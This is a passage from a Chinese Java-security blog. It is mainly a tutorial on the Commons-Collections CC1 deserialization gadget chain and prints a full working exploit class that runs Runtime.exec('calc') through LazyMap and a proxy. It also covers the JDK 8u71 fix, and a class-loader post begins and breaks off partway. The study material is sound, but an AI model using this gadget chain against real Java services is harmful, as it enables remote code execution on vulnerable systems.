runtime);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>能够成功弹出计算器继续查找get方法的用法</p><p>来到AnnotationInvocationHandler的invoke方法</p><p><img src="/img/CC1/c32.png"></p><p>同时这个类也非常好，它里面有 <code>readObject()</code> 方法，可以作为我们的入口类。</p><ul><li>现在的关键点在于我们要触发 <code>AnnotationInvocationHandler.invoke()</code></li></ul><h3 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h3><p>需要触发 <code>invoke</code> 方法，马上想到动态代理，一个类被动态代理了之后，想要通过代理调用这个类的方法，就一定会调用 <code>invoke()</code> 方法。我们去找一找能利用的地方</p><p>我们来看一下invoke这个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();                <span class="hljs-comment">// 获取被调用的方法名</span><br>    Class&lt;?&gt;[] paramTypes = method.getParameterTypes(); <span class="hljs-comment">// 获取参数类型列表</span><br><br>    <span class="hljs-comment">// 处理 Object 类和 Annotation 接口自带的方法</span><br>    <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>        paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>        <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]); <span class="hljs-comment">// 如果调用的是 equals(Object)，交给 equalsImpl 实现</span><br><br>    <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br>        <span class="hljs-comment">// 注解方法不能有参数，如果有参数就抛异常</span><br><br>    <span class="hljs-comment">// 针对几个特殊方法做处理</span><br>    <span class="hljs-keyword">switch</span>(member) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>        <span class="hljs-keyword">return</span> toStringImpl();     <span class="hljs-comment">// 调用 toString 时，返回自定义实现</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>        <span class="hljs-keyword">return</span> hashCodeImpl();     <span class="hljs-comment">// 调用 hashCode 时，返回自定义实现</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>        <span class="hljs-keyword">return</span> type;               <span class="hljs-comment">// 调用 annotationType 时，返回注解的类型对象</span><br>    &#125;<br><br>    <span class="hljs-comment">// 处理普通注解成员方法（即注解里的属性）</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);  <span class="hljs-comment">// 从成员变量 Map 中获取对应值</span><br><br>    <span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IncompleteAnnotationException</span>(type, member);<br>        <span class="hljs-comment">// 如果没有值，说明注解信息不完整，抛出异常</span><br><br>    <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> ExceptionProxy)<br>        <span class="hljs-keyword">throw</span> ((ExceptionProxy) result).generateException();<br>        <span class="hljs-comment">// 如果是异常代理对象，则抛出对应异常</span><br><br>    <span class="hljs-keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="hljs-number">0</span>)<br>        result = cloneArray(result);<br>        <span class="hljs-comment">// 如果值是数组，并且非空，则克隆一份，避免外部修改原始数据</span><br><br>    <span class="hljs-keyword">return</span> result; <span class="hljs-comment">// 返回对应的注解成员值</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>memberValues必须是无参方法</li></ul><p>寻找是否有无参方法的调用</p><p><img src="/img/CC1/c33.png"></p><p>正好看到readObject中有memberValues调用了entrySet，entrySet是一个无参方法</p><p>在这里调用了 <code>entrySet()</code> 方法，也就是说，如果我们将 <code>memberValues</code> 的值改为代理对象，当调用代理对象的方法，那么就会跳到执行 <code>invoke()</code> 方法，最终完成整条链子的调用。</p><p>关于memberValue和找到的无参方法的理解：</p><p>1.<code>memberValues</code> 是什么</p><p>在你这段代码里，核心字段是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br></code></pre></td></tr></table></figure><ul><li><p><code>memberValues</code> 实际上是一个 <strong>Map</strong>，类型大概是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;String, Object&gt; memberValues;<br></code></pre></td></tr></table></figure></li><li><p><strong>作用</strong>：存放注解每个成员（属性）的值。</p><ul><li>Key：注解方法名（比如 <code>&quot;value&quot;</code>, <code>&quot;name&quot;</code>）。</li><li>Value：对应的值（比如 <code>&quot;Hello&quot;</code>, <code>123</code>，或者数组）。</li></ul></li></ul><p>举例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@interface</span> MyAnno &#123;<br>    String <span class="hljs-title function_">name</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">age</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-number">18</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果我们写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@MyAnno(name=&quot;Tom&quot;)</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;&#125;<br></code></pre></td></tr></table></figure><p>那么 <code>memberValues</code> 大概长这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;name&quot;</span> -&gt; <span class="hljs-string">&quot;Tom&quot;</span>,<br>    <span class="hljs-string">&quot;age&quot;</span>  -&gt; <span class="hljs-number">18</span>   <span class="hljs-comment">// 用的是默认值</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>无参方法是谁的方法</li></ol><p>在注解里，<strong>每个“属性”其实就是一个无参方法</strong>。<br> 比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@interface</span> MyAnno &#123;<br>    String <span class="hljs-title function_">value</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">age</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-number">18</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>它在编译后变成接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyAnno</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span> &#123;<br>    String <span class="hljs-title function_">value</span><span class="hljs-params">()</span>;   <span class="hljs-comment">// 这是一个无参方法</span><br>    <span class="hljs-type">int</span> <span class="hljs-title function_">age</span><span class="hljs-params">()</span>;        <span class="hljs-comment">// 这是一个无参方法</span><br>&#125;<br></code></pre></td></tr></table></figure><p>也就是说：</p><ul><li><code>value()</code>、<code>age()</code> <strong>看起来像属性</strong>，但本质上是 <strong>无参方法</strong>。</li><li>调用 <code>myAnno.value()</code> 的时候，实际上 JVM 是通过 <strong>动态代理</strong> 调用到你贴的 <code>invoke()</code> 方法。</li><li>在 <code>invoke()</code> 里，<code>method.getName()</code> 就会得到 <code>&quot;value&quot;</code> 或 <code>&quot;age&quot;</code>，然后到 <code>memberValues</code> 里取值。</li></ul><ol start="3"><li>结合起来看</li></ol><p>当你写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">MyAnno</span> <span class="hljs-variable">anno</span> <span class="hljs-operator">=</span> Test.class.getAnnotation(MyAnno.class);<br>System.out.println(anno.value());<br></code></pre></td></tr></table></figure><p>运行时执行流程是：</p><ol><li><code>anno</code> 其实是一个 <code>Proxy</code> 代理对象。</li><li>调用 <code>anno.value()</code> → JVM 调用 <code>invoke(proxy, method, null)</code>。<ul><li><code>method.getName()</code> &#x3D; <code>&quot;value&quot;</code></li></ul></li><li>在 <code>memberValues</code> 里查 <code>&quot;value&quot;</code> 对应的值。</li><li>返回 <code>&quot;Tom&quot;</code>。</li></ol><p><strong>总结一句话</strong>：</p><ul><li><code>memberValues</code> 存的是 <strong>注解属性名 → 值</strong> 的映射。</li><li>注解里的 <strong>属性方法</strong>（<code>value()</code>, <code>age()</code> 等）就是那些无参方法。</li></ul><p>理解了这个我们就可以开始编写EXP了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-comment">//危险参数构造</span><br>        <span class="hljs-comment">//危险方法，核心危险参数构造</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//触发攻击链子</span><br>                <span class="hljs-comment">//其实这里可以不用这个，因为我们不再需要进入setValue方法</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">// 第一步：通过反射获取Runtime类的getRuntime方法</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 第二步：调用getRuntime方法获取Runtime实例</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 第三步：在Runtime实例上调用exec方法执行计算器</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">// 将三个Transformer组合成链式转换器</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-comment">//生成LazyMap实例</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-comment">// 实例化 AnnotationInvocationHandler</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) aihConstructor.newInstance(Override.class, lazyMap);<br><br>        <span class="hljs-comment">//新建动态代理</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br><br>        <span class="hljs-comment">// 新建AnnotationInvocationHandler实例</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Override.class, mapProxy);<br><br>        <span class="hljs-comment">// 触发序列化 + 反序列化</span><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>顺利弹出计算器</p><p><img src="/img/CC1/c34.png"></p><h3 id="调用链梳理与总结-1"><a href="#调用链梳理与总结-1" class="headerlink" title="调用链梳理与总结"></a>调用链梳理与总结</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">//利用链<br>InvokerTransformer#transform<br>LazyMap#get<br>AnnotationInvocationHandler#readObject<br></code></pre></td></tr></table></figure><p><img src="/img/CC1/c35.png"></p><h2 id="修复手段"><a href="#修复手段" class="headerlink" title="修复手段"></a>修复手段</h2><p>官方这里的推荐修复方法是将 jdk 版本提升至 jdk8u71，我们来看一下为什么官方会推荐这种方法。</p><h3 id="1-对于-TransformerMap-版的-CC1-链子"><a href="#1-对于-TransformerMap-版的-CC1-链子" class="headerlink" title="1. 对于 TransformerMap 版的 CC1 链子"></a>1. 对于 TransformerMap 版的 CC1 链子</h3><p>对于 TransformerMap 版的 CC1 链子来说，jdk8u71 及以后的版本没有了能调用 ReadObject 中 <code>setValue()</code> 方法的地方。</p><p><img src="https://drun1baby.top/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/jdk8u71.png" alt="img"></p><h3 id="2-对于正版-CC1-链子"><a href="#2-对于正版-CC1-链子" class="headerlink" title="2. 对于正版 CC1 链子"></a>2. 对于正版 CC1 链子</h3><p>因为在8u71之后的版本反序列化不再通过<code>defaultReadObject</code>方式，而是通过<code>readFields</code> 来获取几个特定的属性，<code>defaultReadObject</code> 可以恢复对象本身的类属性，比如<code>this.memberValues</code> 就能恢复成我们原本设置的恶意类，但通过<code>readFields</code>方式，<code>this.memberValues</code> 就为null，所以后续执行get()就必然没发触发，这也就是高版本不能使用的原因</p><p><img src="https://drun1baby.top/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/Suite.png" alt="img"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV1yP4y1p7N7?t=994.7">https://www.bilibili.com/video/BV1yP4y1p7N7?t=994.7</a></p><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1?t=2743.1">https://www.bilibili.com/video/BV1no4y1U7E1?t=2743.1</a></p><p><a href="https://drun1baby.top/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/">Java反序列化Commons-Collections篇02-CC1链补充 | Drunkbaby’s Blog</a></p><p><a href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/">https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/</a></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>CC链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全-类的动态加载</title>
    <link href="/2025/08/27/Java%E5%AE%89%E5%85%A8-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/"/>
    <url>/2025/08/27/Java%E5%AE%89%E5%85%A8-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<h1 id="Java安全-类的动态加载"><a href="#Java安全-类的动态加载" class="headerlink" title="Java安全-类的动态加载"></a>Java安全-类的动态加载</h1><h2 id="类加载器及双亲委派"><a href="#类加载器及双亲委派" class="headerlink" title="类加载器及双亲委派"></a>类加载器及双亲委派</h2><h3 id="类加载器有什么用"><a href="#类加载器有什么用" class="headerlink" title="类加载器有什么用"></a>类加载器有什么用</h3><ul><li>加载 Class 文件</li></ul><p>以这段简单代码为例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br></code></pre></td></tr></table></figure><p>我们知道，Student 本身其实是一个抽象类，是通过 new 这个操作，将其实例化的，<strong>类加载器</strong>做的便是这个工作。</p><p>ClassLoader 的工作如图所示</p><p><img src="https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ClassLoaderWork.png"></p><p>加载器也分多种加载器，每个加载器负责不同的功能。</p><p>主要分为这四种加载器</p><blockquote><ol><li>虚拟机自带的加载器</li><li>启动类（根）加载器</li><li>扩展类加载器</li><li>应用程序加载器</li></ol></blockquote><h3 id="几种加载器"><a href="#几种加载器" class="headerlink" title="几种加载器"></a>几种加载器</h3><h4 id="引导类加载器"><a href="#引导类加载器" class="headerlink" title="引导类加载器"></a>引导类加载器</h4><blockquote><p>引导类加载器(BootstrapClassLoader)，底层原生代码是 C++ 语言编写，属于 JVM 一部分。</p></blockquote><p>不继承 <code>java.lang.ClassLoader</code> 类，也没有父加载器，主要负责加载核心 java 库(即 JVM 本身)，存储在 <code>/jre/lib/rt.jar</code> 目录当中。(同时处于安全考虑，<code>BootstrapClassLoader</code> 只加载包名为 <code>java</code>、<code>javax</code>、<code>sun</code> 等开头的类)。</p><h4 id="扩展类加载器（ExtensionsClassLoader）"><a href="#扩展类加载器（ExtensionsClassLoader）" class="headerlink" title="扩展类加载器（ExtensionsClassLoader）"></a>扩展类加载器（ExtensionsClassLoader）</h4><p>扩展类加载器(ExtensionsClassLoader)，由 <code>sun.misc.Launcher$ExtClassLoader</code> 类实现，用来在 <code>/jre/lib/ext</code> 或者 <code>java.ext.dirs</code> 中指明的目录加载 java 的扩展库。Java 虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载 java 类。</p><h4 id="App类加载器（AppClassLoader）"><a href="#App类加载器（AppClassLoader）" class="headerlink" title="App类加载器（AppClassLoader）"></a>App类加载器（AppClassLoader）</h4><p>App类加载器&#x2F;系统类加载器（AppClassLoader），由 <code>sun.misc.Launcher$AppClassLoader</code> 实现，一般通过通过( <code>java.class.path</code> 或者 <code>Classpath</code> 环境变量)来加载 Java 类，也就是我们常说的 classpath 路径。通常我们是使用这个加载类来加载 Java 应用类，可以使用 <code>ClassLoader.getSystemClassLoader()</code> 来获取它。</p><h3 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h3><ul><li>在 Java 开发当中，双亲委派机制是从安全角度出发的。</li></ul><h4 id="从报错的角度感受双亲委派机制"><a href="#从报错的角度感受双亲委派机制" class="headerlink" title="从报错的角度感受双亲委派机制"></a>从报错的角度感受双亲委派机制</h4><p>新建一个 <strong>java.lang的文件夹</strong>，在其中新建 <strong>String.java</strong> 的文件。</p><p><strong>String.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang;  <br>  <br><span class="hljs-comment">// 双亲委派的错误代码  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">String</span> &#123;  <br>  <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>();  <br> s.toString();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>我们自己定义了一个 <code>java.lang</code> 的文件夹，并在文件夹中定义了 String.class，还定义了 String 这个类的 toString 方法。</p><ul><li>运行程序后发现会报错</li></ul><p><img src="/img/java%E5%AE%89%E5%85%A8/a30.png"></p><p>我们定义了main方法，但是仍然会报错</p><p>为什么会报错呢</p><p>首先，我们要知道 Java 的类加载器是分很多层的，如图。</p><p><img src="https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ClassLoaderSequence.png"></p><p>由于类加载器的双亲委派机制限制，类加载器在被调用时也就是在 new class 的时候，它是以这么一个顺序去找的 BOOT —&gt; EXC —-&gt; APP。如果 BOOT 当中没有，就去 EXC 里面找，如果 EXC 里面没有，就去 APP 里面找。</p><ul><li>我们之前报错的程序当中，定义的 <code>java.lang.String</code> 在 BOOT 当中是有的，所以我们自定义 String 时，会报错，如果要修改的话，是需要去 rt.jar 里面修改的，这里就不展开了。</li></ul><h4 id="从正确的角度感受双亲委派机制"><a href="#从正确的角度感受双亲委派机制" class="headerlink" title="从正确的角度感受双亲委派机制"></a>从正确的角度感受双亲委派机制</h4><p>前文提到我们新建的 <code>java.lang.String</code> 报错了，是因为我们定义的 String 和 BOOT 包下面的 String 冲突了，所以才会报错，我们这里定义一个 BOOT 和 EXC 都没有的对象试一试。</p><p><strong>在其他的</strong> 文件夹下，新建 <strong>Student.java</strong></p><p><strong>Student.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;  <br>  <br><span class="hljs-comment">// 双亲委派的正确代码  </span><br><span class="hljs-keyword">public</span> <span 